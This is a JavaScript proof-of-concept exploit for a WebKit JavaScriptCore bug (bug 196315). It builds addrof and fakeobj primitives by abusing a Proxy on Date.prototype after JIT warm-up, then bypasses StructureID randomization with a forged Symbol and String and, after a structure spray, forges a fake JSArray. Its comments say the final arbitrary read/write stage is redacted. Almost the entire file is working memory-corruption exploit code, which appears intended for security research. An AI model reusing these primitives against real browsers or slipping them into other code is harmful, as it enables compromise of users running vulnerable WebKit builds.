/*
 * Copyright (C) 2019 Alexandro Luongo (w00dl3cs).
 *
 * Bug found by Luca Todesco (qwertyoruiop)
 * Original PoC here: http://rce.party/wtf.js
 */

var datePrototype = undefined;

//
// Exploit primitives
//
// Bug Tracker:     https://bugs.webkit.org/show_bug.cgi?id=196315
// WebKit Commit:   https://github.com/WebKit/webkit/commit/09af07796b44d812d937a4b1b52f8b5442a97cc8
//
// "Structure::create should call didBecomePrototype()"
//
var primitives = {
    addrof: function(obj) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function InfoLeaker(arg) {
            0 in date;
            return arg[0];
        }

        for (var i = 0; i < 10000; ++i)
            InfoLeaker(arg);

        var handler = {
            has: function() {
                arg[0] = obj;
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        var addr = InfoLeaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

        throw "Could not leak address using 'addrof' primitive!"
    },
    fakeobj: function(addr) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function ObjFaker(arg) {
            0 in date;
            arg[0] = addr;
        }

        for (var i = 0; i < 10000; ++i)
            ObjFaker(arg);

        var handler = {
            has: function() {
                arg[0] = {};
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        ObjFaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        var obj = arg[0];

        if (typeof obj === 'object')
            return obj;

        throw "Could not inject fake object using 'fakeobj' primitive!"
    }
};

//
// Update: December, 2019
//
// On December, 5th 2019, security researcher Wang Yong (@ThomasKing2014) from
// Alibaba Security presented his talk "Thinking outside the JIT Compiler" at
// BlackHat Europe, proposing two different methods to bypass StructureID
// randomization.
//
// You can find his presentation here (for reference):
// https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
//
// As a public technique to bypass such mitigation has been released, I think
// it's time to update this exploit to reflect the changes accordingly.
//
function leakStructureId(victimObj) {
    var symbolCellHeader = new Int64([
        0x00, 0x00, 0x00, 0x00,
        0x0,
        0x2,
        0x10,
        0x1
    ]);

    var lengthAndFlag = new Int64([
        0x02, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00
    ]);

    var container = {
        jsCellHeader: symbolCellHeader.asJSValue(),
        m_uid: null,
        length_flag: lengthAndFlag.asDouble(),
        description: victimObj
    };

    var containerAddr = primitives.addrof(container);
    var fakeSymbolAddr = Add(containerAddr, 0x10);
    var fakeStringAddr = Add(fakeSymbolAddr, 0x10);

    var fakeString = primitives.fakeobj(fakeStringAddr.asDouble());

    container.m_uid = fakeString;

    var fakeSymbol = primitives.fakeobj(fakeSymbolAddr.asDouble());

    var structureId = "";
    var symbolDescription = Symbol.prototype.toString.call(fakeSymbol);
    for (var i = 0; i < 2; ++i)
        structureId += ("0000" + symbolDescription.charCodeAt(8 - i).toString(16)).slice(-4);

    return structureId.match(/.{1,2}/g).map(x => "0x" + x).reverse();
}

var structs = [];

function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs.push(a);
    }
}

function pwn() {
    sprayStructures();

    var targetArray = new Array();
    var structureId = leakStructureId(targetArray);

    var jsContiguousCellHeader = new Int64([
        ...structureId,                        // m_structureID
        0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

    var victim = structs[Math.floor(Math.random() * structs.length)];

    var container = {
        jsCellHeader: jsContiguousCellHeader.asJSValue(),
        butterfly: victim
    };

    var containerAddr = primitives.addrof(container);
    print("[+] Container @ " + containerAddr);

    var fakeArrayAddr = Add(containerAddr, 0x10);
    print("[+] Fake Array @ " + fakeArrayAddr);

    var driver = primitives.fakeobj(fakeArrayAddr.asDouble());

    if (!(driver instanceof Array))
        throw "Could not create fake Array!";

    //
    // For brevity, the remaining part of the exploitation process has
    // been redacted: you can find the in-depth analysis in other
    // write-ups available on this repository.
    //
    // Keep in mind that WebAssembly memory is now caged, and that
    // at the time of writing there is no public technique which can
    // be used to bypass that mitigation. But with Structure ID randomization
    // not being a problem anymore, one could achieve arbitrary memory
    // R/W primitives by abusing boxed/unboxed arrays.
    //
    // If you want to read more about the mitigations discussed here,
    // ypu can have a look at the following commits on the WebKit repository:
    //
    // * WebAssembly Gigacage:      https://github.com/WebKit/webkit/commit/385d20a0e36c9a7db638b26273ddc9c92b573cdc
    // * StructureID randomization: https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf
    //
}

function init() {
    datePrototype = Object.getPrototypeOf(Date.prototype);
}

ready.then(function() {
    try {
        init();
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});